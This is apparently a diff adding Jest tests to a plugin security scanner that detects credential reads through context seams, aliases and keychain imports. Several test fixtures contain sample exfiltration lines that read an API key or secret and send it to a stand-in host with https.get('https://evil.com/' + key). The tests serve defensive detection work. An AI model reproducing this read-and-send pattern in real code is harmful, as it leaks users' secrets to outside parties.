@@ -95,6 +95,106 @@ describe('scanShape', () => {
     expect(credentialReadCalls("const k = await ctx.credentials.resolve('K')", [])).toEqual(["credentials.resolve("])
   })
 
+  it('does not treat a local readRecord helper as a credential read', () => {
+    expect(credentialReadCalls('const record = readRecord()', [])).toEqual([])
+    expect(credentialReadCalls('const record = await this.readRecord()', [])).toEqual([])
+    const local = auditPlugin(input({
+      'a.js': [
+        'const readRecord = () => folders.get()',
+        'const record = readRecord()',
+        "https.get('https://evil.com/' + record.id)",
+      ].join('\n'),
+    }))
+    expect(local.redLines.some(l => l.startsWith('reads credentials/secrets'))).toBe(false)
+    expect(local.capabilities).not.toContain('credentials')
+  })
+
+  it('reads chained and optional-chained seam value calls, without aliasing the result', () => {
+    expect(credentialReadCalls("await ctx.get('credentials').readRecord('K')", [])).toEqual([
+      "ctx.get('credentials').readRecord(",
+    ])
+    expect(credentialReadCalls("await ctx.get('credentials').resolve('K')", [])).toEqual([
+      "ctx.get('credentials').resolve(",
+    ])
+    expect(credentialReadCalls("await ctx.credentials?.readRecord('K')", [])).toEqual([
+      'credentials?.readRecord(',
+    ])
+    expect(collectSeamAliases([
+      "const k = await ctx.get('credentials').readRecord('K')",
+    ])).not.toContain('k')
+
+    for (const line of [
+      "const key = await ctx.get('credentials').readRecord('API_KEY')",
+      "const key = await ctx.get('credentials').resolve('API_KEY')",
+      "const key = await ctx.credentials?.readRecord('API_KEY')",
+    ]) {
+      const report = auditPlugin(input({
+        'a.js': [line, "https.get('https://evil.com/' + key)"].join('\n'),
+      }))
+      expect(report.redLines.some(l => l.startsWith('reads credentials/secrets')), line).toBe(true)
+      expect(report.capabilities, line).toContain('credentials')
+    }
+  })
+
+  it('does not alias a seam receiver that is immediately called', () => {
+    expect(collectSeamAliases(["const x = ctx.get('credentials')()"])).not.toContain('x')
+    expect(collectSeamAliases(['const x = ctx.credentials()'])).not.toContain('x')
+    const report = auditPlugin(input({
+      'a.js': [
+        "const x = ctx.get('credentials')()",
+        "const key = await x.resolve('API_KEY')",
+        "https.get('https://evil.com/' + key)",
+      ].join('\n'),
+    }))
+    expect(report.redLines.some(l => l.startsWith('reads credentials/secrets'))).toBe(false)
+  })
+
+  it('does not treat property assignment as a local seam alias', () => {
+    expect(collectSeamAliases([
+      "this.credentialsProvider = credCtx.credentials ?? null",
+    ])).not.toContain('credentialsProvider')
+    expect(collectSeamAliases([
+      "obj.creds = ctx.get('credentials')",
+    ])).not.toContain('creds')
+    // Plain local reassignment (no receiver) still counts.
+    expect(collectSeamAliases([
+      'credentialsProvider = credCtx.credentials ?? null',
+    ])).toContain('credentialsProvider')
+
+    const report = auditPlugin(input({
+      'a.js': [
+        "this.credentialsProvider = credCtx.credentials ?? null",
+        'const credentialsProvider = otherStore',
+        "const key = await credentialsProvider.resolve('API_KEY')",
+        "https.get('https://evil.com/' + key)",
+      ].join('\n'),
+    }))
+    expect(report.redLines.some(l => l.startsWith('reads credentials/secrets'))).toBe(false)
+  })
+
+  it('reads through a reassigned *Ctx credentials provider, including ?? null', () => {
+    const aliases = collectSeamAliases([
+      'let credentialsProvider = null',
+      'credentialsProvider = credCtx.credentials ?? null',
+    ])
+    expect(aliases).toContain('credentialsProvider')
+    expect(credentialReadCalls(
+      'const record = await credentialsProvider.readRecord(KEY)',
+      aliases,
+    )).toEqual(['credentialsProvider.readRecord('])
+
+    const report = auditPlugin(input({
+      'a.js': [
+        'let credentialsProvider = null',
+        'credentialsProvider = credCtx.credentials ?? null',
+        'const record = await credentialsProvider.readRecord(KEY)',
+        "https.get('https://evil.com/' + record.secret)",
+      ].join('\n'),
+    }))
+    expect(report.redLines.some(l => l.startsWith('reads credentials/secrets'))).toBe(true)
+    expect(report.capabilities).toContain('credentials')
+  })
+
   it('collects every shape that binds the seam, and keychain imports', () => {
     const aliases = collectSeamAliases([
       "const a = ctx.get('credentials')",
@@ -106,6 +206,7 @@ describe('scanShape', () => {
       "const h = ctx.get?.('credentials')",
       "const { credentials } = ctx",
       "const { credentials: creds } = appCtx",
+      "credentialsProvider = credCtx.credentials ?? null",
       "const f = a",
       "b = f",
       "import kt from 'keytar'",
@@ -114,7 +215,7 @@ describe('scanShape', () => {
       "const kc = require('keychain')",
     ])
     const has = (name: string) => aliases.includes(name) || aliases.includes(`keychain:${name}`)
-    for (const name of ['a', 'b', 'c', 'd', 'e', 'g', 'h', 'credentials', 'creds', 'f', 'keytar', 'keychain', 'kt', 'ns', 'def', 'kc']) {
+    for (const name of ['a', 'b', 'c', 'd', 'e', 'g', 'h', 'credentials', 'creds', 'credentialsProvider', 'f', 'keytar', 'keychain', 'kt', 'ns', 'def', 'kc']) {
       expect(has(name), name).toBe(true)
     }
     // Renamed keychain modules carry their kind so the keychain method set is used.
@@ -136,6 +237,7 @@ describe('scanShape', () => {
       ].join('\n'),
     }))
     expect(renamed.band).toBe('red')
+    expect(renamed.capabilities).toContain('credentials')
 
     const ns = auditPlugin(input({
       'a.js': [
